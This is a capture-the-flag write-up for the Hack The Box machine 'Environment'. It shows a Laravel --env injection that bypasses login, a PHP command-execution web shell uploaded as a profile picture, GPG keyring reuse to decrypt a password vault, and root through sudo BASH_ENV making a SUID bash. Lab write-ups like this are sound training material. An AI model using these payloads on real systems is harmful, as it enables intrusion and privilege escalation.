💥 HTB – Environment (Hard) — Laravel ➜ Env Desync ➜ Preprod Bypass ➜ PHP Upload ➜ GPG Key ➜ Password Reuse ➜ SUID Bash Root
🧠 Initial Recon

nmap -sC -sV -Pn -p- 10.10.11.67

🔓 Open Ports

22/tcp   OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp   nginx 1.22.1 (Laravel detected)

🔁 HTTP Redirection

http://environment.htb redirects to http://environment.htb

Added to /etc/hosts:

echo '10.10.11.67 environment.htb' | sudo tee -a /etc/hosts

🌐 Web Enumeration (Port 80)

    Laravel backend (PHP + nginx + Debian)

    Accessible routes:

        /login, /logout, /mailing, /upload, /vendor, /page, etc.

    /mailing & /upload: 405 Method Not Allowed (but accessible)

    /page parameter is reflecting input via --env param:

curl 'http://environment.htb/?--env=test'

🧠 Input is injected into the HTML title, possibly manipulating Laravel's App::environment() check.
⚙️ Environment Injection ➜ Preprod Bypass

Source code (from forced error) revealed:

if(App::environment() == "preprod") {
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}

🚨 Sent login POST request with arbitrary creds + GET param:

http://environment.htb/login?--env=preprod

✅ Result: Logged in as Hish due to environment override.
🖼️ Profile Pic Upload ➜ File Upload Exploit

Only profile picture update was allowed. Bypassed restrictions by uploading a disguised PHP file:

<?php
  if(isset($_GET['cmd'])) {
    system($_GET['cmd'] . ' 2>&1');
  }
?>

Used multipart/form-data with .php. extension.

Accessed shell at:

http://environment.htb/storage/files/shell.php?cmd=id

💥 Remote Code Execution achieved — user: www-data
🗂️ Post-Exploitation – Config Files & DB

    Found SQLite database

    Extracted bcrypt hashes from users table — couldn’t crack

    Located a GPG encrypted vault: /home/hish/backup/keyvault.gpg

🔓 GPG Key Hijack & Decryption

Exported and reused .gnupg keyring:

cp -r /home/hish/.gnupg /tmp/
export GNUPGHOME=/tmp/.gnupg
chmod 700 /tmp/.gnupg
gpg --list-secret-keys

Decrypted keyvault:

gpg --decrypt /home/hish/backup/keyvault.gpg

📦 Extracted secrets:

ENVIRONMENT.HTB → marineSPm@ster!!
PAYPAL.COM → Ihaves0meMon$yhere123
FACEBOOK.COM → summerSunnyB3ACH!!

✅ Reused creds — marineSPm@ster!! for SSH login ➜ hish
🔼 Privilege Escalation ➜ SUID Bash via BASH_ENV

Checked sudo perms:

sudo -l

✅ hish can run:

(ALL) /usr/bin/systeminfo

env_keep+="BASH_ENV" enabled ➜ used this for code injection:

Created /tmp/test.sh:

#!/bin/bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash

Executed with:

sudo BASH_ENV=/tmp/test.sh /usr/bin/systeminfo

➡️ Spawned a SUID shell:

/tmp/bash -p

🏁 Rooted the box.
